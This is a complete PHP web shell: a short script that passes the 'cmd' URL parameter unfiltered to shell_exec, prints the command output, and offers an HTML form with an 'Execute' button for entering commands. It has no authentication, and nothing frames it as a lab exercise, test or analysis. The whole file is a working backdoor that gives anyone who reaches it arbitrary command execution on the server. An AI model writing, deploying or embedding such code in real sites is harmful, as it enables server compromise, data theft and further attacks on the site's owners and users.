<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
<form method="get">
    <input type="text" name="cmd" size="80">
    <input type="submit" value="Execute">
</form>
